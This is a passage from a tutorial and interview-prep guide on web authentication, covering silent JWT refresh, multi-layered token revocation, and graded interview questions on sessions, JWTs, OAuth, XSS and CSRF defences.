> **Key Takeaway:** Account linking is the hardest part of adding social login to existing apps. Always match by email first, and design your User model to support multiple auth methods from the start. The priority order is: check googleId → check email → create new.

### Problem 6: "Mobile App Tokens Keep Expiring While Users Are Active"

**Scenario:** Your mobile app uses JWT access tokens (15 min) with refresh tokens. Users complain that they get logged out while actively using the app — right in the middle of scrolling their feed.

**Think about it first:** Why would an active user's token expire?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: Does the token actually expire while the user is active?
  → YES. The token has a fixed 15-min TTL from when it was issued.
  → The user being "active" doesn't extend the token. It's not a sliding window.
  → After 15 minutes, the next API call returns 401 Token Expired.

Step 2: What does the mobile app do when it gets a 401?
  → If it does nothing → user sees an error or gets kicked to login
  → This is the problem! The app isn't handling token expiry gracefully.

Step 3: What SHOULD the app do?
  → When it gets a 401, it should AUTOMATICALLY call /api/auth/refresh
  → Get a new access token using the refresh token (stored in cookie)
  → Retry the ORIGINAL request with the new token
  → User should never notice this happened.

Step 4: What if multiple requests fail at the same time?
  → User has 5 feed items loading simultaneously
  → All 5 get 401 at once
  → We should NOT make 5 refresh calls!
  → Solution: Queue failed requests, make ONE refresh, retry all.

Step 5: What if the refresh token is ALSO expired?
  → Then the refresh call itself returns 401
  → At this point, we MUST redirect to login
  → This is the only time the user should see a login screen.
```

#### 🔍 The Root Cause

**The Problem:**
The mobile app gets a 401 (Token Expired) on an API call, but doesn't automatically refresh the token. The user sees an error or gets redirected to login.

#### ✅ The Fix — Silent Token Refresh (Axios Interceptor Pattern)

```javascript
// Mobile app / Frontend — Axios interceptor
import axios from 'axios';

let isRefreshing = false;
let failedQueue = [];

// Queue requests that fail while refresh is in progress
function processQueue(error, token = null) {
  failedQueue.forEach(({ resolve, reject }) => {
    error ? reject(error) : resolve(token);
  });
  failedQueue = [];
}

axios.interceptors.response.use(
  (response) => response,  // Success — pass through
  async (error) => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      // If already refreshing, queue this request
      if (isRefreshing) {
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        }).then((token) => {
          originalRequest.headers.Authorization = `Bearer ${token}`;
          return axios(originalRequest);
        });
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Call refresh endpoint (refresh token is in HttpOnly cookie)
        const { data } = await axios.post('/api/auth/refresh');
        const newToken = data.accessToken;
        
        // Update default header
        axios.defaults.headers.Authorization = `Bearer ${newToken}`;
        
        // Retry the original request with new token
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        
        processQueue(null, newToken);
        return axios(originalRequest);
      } catch (refreshError) {
        processQueue(refreshError);
        // Refresh failed — redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);
```

**What this does step by step:**
```
1. User's access token expires while scrolling
2. API call returns 401 Token Expired
3. Interceptor catches 401 → calls /api/auth/refresh
4. Gets new access token → retries the ORIGINAL request
5. User never sees anything — seamless experience ✅

If multiple requests fail at once:
  → Only ONE refresh call is made
  → All other failed requests are queued
  → Once refreshed, all queued requests are retried with new token
```

> **Key Takeaway:** Token refresh must be **invisible** to the user. The interceptor pattern handles this by catching 401s, refreshing, and retrying — all without the user knowing. This is how Netflix, Gmail, and every production app works. If your users are seeing login screens after 15 minutes, you're missing this pattern.

### Problem 7: "Admin Can't Revoke a Compromised User's Access Immediately"

**Scenario:** A user's account is compromised (attacker has their JWT). The admin wants to immediately block this user. But the JWT is valid for 15 more minutes, and the system is stateless (no blacklist).

**Think about it first:** How do you immediately revoke a stateless JWT?

#### 🧠 Thought Process (How to Think About This)

```
Step 1: Why can't we just "invalidate" the JWT?
  → JWTs are stateless. There's no server-side record of them.
  → The server verifies JWTs using the secret key + expiry check.
  → If the JWT is valid and not expired, the server MUST accept it.
  → There's no "revoked tokens" list to check against (by default).

Step 2: So the attacker has 15 minutes of free access?
  → With pure stateless JWT — YES. That's the downside.
  → The token is self-contained. The server can't distinguish 
     "legitimate user's token" from "attacker's stolen token."

Step 3: What if we add a small stateful check?
  → Add a Redis lookup: "Is this user blocked?"
  → It's ONE extra Redis call per request (~1ms)
  → This breaks "pure stateless" but adds instant revocation.

Step 4: What about the refresh token?
  → Refresh tokens ARE stateful (stored in DB)
  → Delete them → attacker can't get new access tokens
  → But they still have access until current JWT expires (15 min)

Step 5: What about token versioning?
  → User model has tokenVersion = 5
  → JWT was signed with ver = 5
  → Admin bumps to ver = 6
  → Next time JWT is verified, middleware checks: 
     decoded.ver (5) !== user.tokenVersion (6) → REJECTED
  → But this requires a DB call... same tradeoff as Redis.

Step 6: Best approach?
  → USE ALL THREE TOGETHER:
     1. Redis blacklist (immediate block)
     2. Token version bump (blocks on next verification)
     3. Delete refresh tokens (prevents new access tokens)
     4. Set isBlocked flag (prevents future login)
  → Defense in depth — multiple layers for redundancy.
```

#### 🔍 The Solution — Multi-Layered Revocation

**Option 1: Redis Blacklist (Immediate)**

```javascript
// Admin action: block user
async function blockUser(userId) {
  const user = await User.findById(userId);
  user.isBlocked = true;
  await user.save();

  // Blacklist the user's current token(s) in Redis
  await redis.set(`blocked:${userId}`, 'true', 'EX', 900); // 15 min (max token TTL)
}

// In auth middleware — check blacklist
async function authMiddleware(req, res, next) {
  // ... verify JWT ...
  
  const isBlocked = await redis.get(`blocked:${decoded.sub}`);
  if (isBlocked) {
    return res.status(403).json({ error: "Account suspended" });
  }
  
  next();
}
```

**Option 2: Token Version Bump (Next Request)**

```javascript
// Admin blocks user → increment tokenVersion
await User.updateOne({ _id: userId }, { 
  $inc: { tokenVersion: 1 },
  $set: { isBlocked: true }
});

// All existing JWTs have old version → rejected on next request
```

**Option 3: Delete All Refresh Tokens (Effective at next refresh)**

```javascript
await RefreshToken.deleteMany({ userId: userId });
// User can't get new access tokens, locked out after current one expires
```

**Best practice: Use all three together:**
```
1. Redis blacklist → Immediate block (for remaining access token TTL)
2. Token version bump → Blocks future tokens
3. Delete refresh tokens → Prevents token renewal
4. Set isBlocked flag → Prevents login
```

> **Key Takeaway:** True instant revocation in a stateless system requires a small stateful addition (Redis blacklist). The "pure stateless" dream has practical limits. Production systems are always a hybrid — mostly stateless with strategic stateful checkpoints for security-critical operations.

## 💼 Interview Questions — By Level

---

### 🟢 Level 1: Fresher / Entry-Level (0-1 Year Experience)

These test your **fundamental understanding** of auth concepts. Interviewers want to know if you understand the "why" behind each mechanism.

---

**Q1: What is the difference between authentication and authorization?**

> **Expected Answer:**
> Authentication verifies **identity** — "Who are you?" (login, password check, biometrics).
> Authorization verifies **permissions** — "What can you do?" (role checks, access control).
> Authentication always happens FIRST. You can't authorize someone you haven't identified.

**Follow-up:** Can you give a real-world analogy?
> Airport security: Your passport is **authentication** (proves who you are). Your boarding pass is **authorization** (proves you can board this specific flight).

---

**Q2: Why should passwords never be stored in plain text?**

> **Expected Answer:**
> If the database is breached, every user's password is exposed. Since people reuse passwords, attackers can use them on other platforms (credential stuffing). Hashing with bcrypt/argon2 is one-way — even if the hash is stolen, the original password can't be recovered.

**Follow-up:** What's the difference between hashing and encryption?
> Hashing is **one-way** (can't get original back). Encryption is **two-way** (can decrypt with a key). Passwords should be hashed, not encrypted. If you can decrypt your users' passwords, your system is insecure.

---

**Q3: What is a session? How does it work?**

> **Expected Answer:**
> A session is server-side state linked to a user. The server generates a unique Session ID, stores user data alongside it in a store (Redis/DB), and sends the Session ID to the client as a cookie. On subsequent requests, the browser auto-sends the cookie, and the server looks up the session to identify the user.

**Follow-up:** Where should sessions be stored in production?
> Redis (in-memory store). Not in the server's memory (won't survive restarts, doesn't work with multiple servers) and not in the main database (too slow for per-request lookups).

---

**Q4: What is a JWT? What are its three parts?**

> **Expected Answer:**
> JWT (JSON Web Token) is a self-contained, stateless token. Three parts separated by dots:
> 1. **Header** — algorithm and token type (`{ "alg": "HS256", "typ": "JWT" }`)
> 2. **Payload** — user data/claims (`{ "sub": "userId", "role": "admin", "exp": ... }`)
> 3. **Signature** — cryptographic verification using a secret key
>
> All three are base64-encoded. The signature ensures the payload hasn't been tampered with.

**Follow-up:** Can you decode a JWT without the secret key?
> Yes — the header and payload are just base64-encoded (not encrypted). Anyone can decode them. The secret key is only needed to **verify** the signature (prove it wasn't tampered with). That's why you should never put sensitive data (passwords, credit cards) in a JWT payload.

---

**Q5: What is the purpose of the `HttpOnly` flag on cookies?**

> **Expected Answer:**
> `HttpOnly` prevents JavaScript from accessing the cookie via `document.cookie`. This protects against XSS attacks — even if an attacker injects malicious JS into your page, they can't steal the auth token stored in the cookie.

---

**Q6: Why do we use `bcrypt.compare()` instead of `===` for password comparison?**

> **Expected Answer:**
> 1. You can't directly compare because the password is hashed — you need bcrypt to re-hash the input with the same salt and compare the results.
> 2. `bcrypt.compare()` uses constant-time comparison to prevent timing attacks — `===` would return faster for non-matching strings, leaking information.

---

**Q7: What's the difference between 401 and 403 HTTP status codes?**

> **Expected Answer:**
> - **401 Unauthorized** = "Who are you?" — The request lacks valid authentication credentials. The user is not logged in or the token is invalid/expired.
> - **403 Forbidden** = "I know who you are, but you can't do this." — The user is authenticated but doesn't have permission to access the resource.

---

**Q8: What happens when a user logs out in a session-based system vs a JWT-based system?**

> **Expected Answer:**
> - **Session-based:** Destroy the session on the server (delete from Redis/DB) and clear the cookie. Simple and effective — the session ID becomes meaningless.
> - **JWT-based:** Harder. You can't invalidate a JWT (it's self-contained). Options include: maintaining a blacklist in Redis, waiting for natural expiry, or using token versioning.

---

### 🟡 Level 2: Junior Developer (1-2 Years Experience)

These test your ability to **implement** auth systems and understand tradeoffs.

---

**Q9: When would you choose session-based auth over JWT? And vice versa?**

> **Expected Answer:**
> 
> | Session-based | JWT |
> |---|---|
> | Web apps with browser clients | APIs, mobile apps, microservices |
> | Need instant logout/revocation | Scalability is priority |
> | Moderate traffic | High traffic, distributed systems |
> | Centralized server architecture | Multiple servers/services |
> 
> In practice, many systems use a **hybrid** — sessions for web, JWTs for APIs.

**Follow-up:** What's the paradox of JWT with a blacklist?
> If you add a Redis blacklist to revoke JWTs, you're doing a database lookup on every request — which is essentially what sessions do. At that point, you've lost the "stateless" benefit.

---

**Q10: How would you implement role-based access control (RBAC)?**

> **Expected Answer:**
> 1. Add a `role` field to the User model (e.g., 'user', 'admin', 'moderator').
> 2. Create an `authorize()` middleware that accepts allowed roles.
> 3. Chain middlewares: `authMiddleware` → `authorize('admin')` → route handler.
> 4. Auth middleware extracts user identity from token/session.
> 5. Authorize middleware checks if the user's role is in the allowed list.
> 6. Return 403 if unauthorized, call `next()` if authorized.

**Follow-up:** What's the limitation of simple role-based auth?
> It's coarse-grained. An "editor" can either do everything an editor can do, or nothing. You can't say "this editor can edit posts but not delete them." Permission-based authorization (e.g., `notes:edit`, `notes:delete`) solves this.

---

**Q11: How do refresh tokens work? Why do we need them?**

> **Expected Answer:**
> Access tokens are short-lived (15 min) for security. Refresh tokens are long-lived (7 days) for convenience. When the access token expires, the client sends the refresh token to a `/refresh` endpoint to get a new access token — without re-entering credentials.
> 
> **Why two tokens?** Access tokens are sent with every request (high exposure). If stolen, damage is limited to 15 minutes. Refresh tokens are sent only to one endpoint (low exposure) and are stored in HttpOnly cookies.
> 
> **Token rotation:** Each refresh generates a NEW refresh token and deletes the old one. If an old refresh token is reused, it means it was stolen → invalidate all tokens.

---

**Q12: Explain an XSS attack and how to prevent it in the context of authentication.**

> **Expected Answer:**
> XSS (Cross-Site Scripting) = attacker injects malicious JavaScript into your website. If auth tokens are stored in `localStorage`, the injected script can read `localStorage.getItem('token')` and send it to the attacker's server.
> 
> **Prevention:**
> - Store tokens in HttpOnly cookies (JS can't access them)
> - Sanitize all user input
> - Use Content Security Policy headers
> - Never use `innerHTML` with user content

---

**Q13: What is a CSRF attack? How does `SameSite` cookie attribute prevent it?**

> **Expected Answer:**
> CSRF = attacker tricks a user's browser into making unwanted requests to your server. Since cookies are auto-attached, the server thinks it's a legitimate request.
> 
> `SameSite: 'strict'` means the cookie is ONLY sent for same-site requests. If `evil.com` tries to submit a form to `bank.com`, the browser won't attach the cookie because the request is cross-site.

---

**Q14: How would you implement a secure password reset flow?**

> **Expected Answer:**
> 1. User submits email → server generates cryptographically random token
> 2. Token is **hashed** (SHA-256) before storing in DB
> 3. Plain token is sent in the email link
> 4. Token has short expiry (10 minutes)
> 5. When user clicks link → server hashes the URL token → matches with DB
> 6. On success → hash new password, delete reset token, invalidate all sessions
> 7. Return same response whether email exists or not (prevent enumeration)

---

**Q15: Design an auth system that supports both email/password AND Google login for the same user.**

> **Expected Answer:**
> The key challenge is **account linking**.
> 
> User model needs: `email`, `password` (optional), `googleId` (optional), `authMethods[]`.
> 
> When Google login happens:
> 1. Check if `googleId` exists → return existing user
> 2. Check if `email` matches an existing user → link Google to that account
> 3. Neither exists → create new user (no password needed)
> 
> When email/password login happens → normal flow, but Google users without passwords can't use this path.
> 
> Edge case: Allow users to add a password later (for users who only signed up via Google but want email/password as backup).

**Q16: How would you handle token revocation in a microservices architecture?**

> **Expected Answer:**
> Options (ranked by effectiveness):
> 1. **Short-lived access tokens** — Accept 15-min delay. Simplest.
> 2. **Redis blacklist** — Auth middleware checks Redis for blacklisted JTIs. ~1ms overhead per request. Used by Netflix, Stripe.
> 3. **Token version** — User model has `tokenVersion`. JWT includes `ver` claim. Increment version to invalidate all user tokens.
> 4. **Event-driven** — Publish "user-blocked" event to message bus. All services subscribe and add to local blacklist.
> 
> In microservices with an API Gateway, the gateway handles blacklist checks centrally so individual services don't need to.

---

**Q17: What is the difference between HS256 and RS256 for JWT signing? When would you use each?**

> **Expected Answer:**
> - **HS256** (symmetric): Same secret key signs AND verifies. Every service that verifies needs the secret. If any service is compromised, all tokens can be forged. Simple, fast.
> - **RS256** (asymmetric): Private key signs, public key verifies. Only the auth service has the private key. Other services only have the public key (can verify but not forge). More secure for distributed systems.
> 
> **Use HS256** for monoliths (single server, simple).
> **Use RS256** for microservices (multiple services need to verify tokens, but only one should sign them).

**Q18: How would you implement multi-tenant authorization in a SaaS app?**

> **Expected Answer:**
> 1. Every model has an `organizationId` field
> 2. User model includes `organizationId` and `orgRole` (owner, admin, member, viewer)
> 3. Tenant isolation middleware adds `{ organizationId: req.user.organizationId }` to every query
> 4. Even when fetching by ID, always include org scope: `findOne({ _id, organizationId })`
> 5. Organization-level RBAC: separate middleware checks the user's role within their org
> 
> Middleware chain: `authMiddleware → tenantIsolation → orgAuthorize → handler`
> 
> Critical: NEVER trust the client to send `organizationId`. Always derive it from the authenticated user's token/session.

---

**Q19: A user reports they received a password reset email they didn't request. What happened and what should you do?**

> **Expected Answer:**
> **What happened:** Someone entered this user's email in the forgot password form. This could be:
> - An accidental typo by someone else
> - An attacker probing to see if the account exists
> - An attacker attempting account takeover
> 
> **Immediate actions:**
> 1. The reset token will expire naturally (10 min) — no action needed if not clicked
> 2. Check server logs for the IP address that requested the reset
> 3. Check if there are mass reset requests (could indicate an automated attack)
> 
> **If it's an attack pattern:**
> 4. Rate limit the forgot-password endpoint more aggressively
> 5. Consider adding CAPTCHA to the reset form
> 6. Alert the user to enable 2FA
> 
> **Why your response to the user should say:** "If you didn't request this, you can safely ignore the email. The link will expire shortly." — Standard, non-alarming, factual.

**Q20: How would you implement "Remember Me" functionality?**

> **Expected Answer:**
> - Without "Remember Me": Session cookie with no `maxAge` (browser session cookie → deleted when browser closes)
> - With "Remember Me" checked: Set `maxAge` to 30 days on the session cookie
> 
> For JWT systems:
> - Without: Access token only (15 min), no refresh token
> - With "Remember Me": Issue a long-lived refresh token (30 days) in HttpOnly cookie
> 
> Security consideration: "Remember Me" tokens should be stored alongside a device identifier. If a remember-me token is used from a different device/IP, require re-authentication.

**Q22: How would you handle secret rotation without downtime?**

> **Expected Answer:**
> **Dual-key strategy:**
> 
> Phase 1: Add new key alongside old key
> - Sign new tokens with Key V2
> - Verify against both V1 and V2
> 
> Phase 2: Grace period (duration = max token TTL)
> - All new tokens use V2
> - Old V1 tokens gradually expire
> 
> Phase 3: Remove old key
> - After all V1 tokens have expired, remove V1
> - Only V2 exists now
> 
> **Automation:** Use a secrets manager (Vault, AWS Secrets Manager) with rotation policies. The auth service watches for secret changes and smoothly adds new keys to its verification set.
> 
> **JWKS approach (RS256):** Publish both old and new public keys in the JWKS endpoint. Services fetch the latest JWKS and try all available keys for verification. This makes rotation completely transparent.

---

**Q23: A security audit reveals that your system is vulnerable to token replay attacks. How do you fix it?**

> **Expected Answer:**
> **Token replay** = attacker intercepts a valid token and reuses it.
> 
> **Defense layers:**
> 1. **HTTPS everywhere** — Prevents token interception via network sniffing
> 2. **Short token TTL** — 15-min access tokens limit the replay window
> 3. **JTI (JWT ID) claim** — Add a unique ID to each token. On critical operations, record used JTIs and reject reuse.
> 4. **Audience (`aud`) claim** — Token is only valid for the intended service
> 5. **Token binding** — Bind token to client fingerprint (IP + User-Agent hash). If token is used from a different fingerprint, reject.
> 6. **Mutual TLS (mTLS)** — Client proves its identity with a certificate. Even if token is stolen, attacker can't present the client certificate.
> 
> **For high-security (banking):** DPoP (Demonstrating Proof of Possession) — client generates a key pair, signs each request with private key, server verifies with public key embedded in the token.

**Q24: How do you design an OAuth 2.0 provider (not consumer)?**

> **Expected Answer:**
> Building an OAuth provider means your platform allows third-party apps to access user data (like Google does for "Sign in with Google").
> 
> **Core components:**
> 1. **Authorization Server** — Handles consent screen, issues auth codes and tokens
> 2. **Client Registry** — Stores registered third-party apps (client_id, client_secret, redirect_uris)
> 3. **Consent Management** — Stores which users granted which permissions to which apps
> 4. **Token Store** — Auth codes (short-lived), access tokens, refresh tokens
> 5. **Resource Server** — APIs that third-party apps access with bearer tokens
> 
> **Security requirements:**
> - Auth codes are single-use and expire in 60 seconds
> - PKCE required for public clients
> - Redirect URI must exactly match registered URI (prevent open redirect attacks)
> - Scope enforcement on every API call
> - Token revocation endpoint
> - Rate limiting on token endpoint
> 
> **In practice:** Use a battle-tested library (ORY Hydra, Spring Authorization Server) rather than building from scratch. The OAuth spec has dozens of edge cases and security considerations.

**Q25: You're migrating a monolith to microservices. The monolith has session-based auth with 2M active users. How do you migrate without logging everyone out?**

> **Expected Answer:**
> **Phase 1 (Parallel run):**
> - Deploy new Auth Service alongside monolith
> - Both read from same Redis session store
> - Monolith continues to handle login/logout
> - New services can validate sessions via shared Redis
> 
> **Phase 2 (Dual token support):**
> - Auth Service starts issuing JWTs alongside sessions on login
> - Client receives both session cookie AND JWT
> - New microservices use JWT, monolith uses session
> - Both are valid simultaneously
> 
> **Phase 3 (Gradual migration):**
> - New logins only get JWT (stop creating sessions)
> - Existing sessions remain valid until they expire naturally
> - Monolith is modified to accept JWTs
> - Users with old sessions are gradually migrated on next login
> 
> **Phase 4 (Cleanup):**
> - Remove session support from monolith
> - Decommission session Redis
> - All auth is JWT-based through the Auth Service
> 
> **Key principle:** No user should be forced to re-login during the migration. The transition must be invisible.
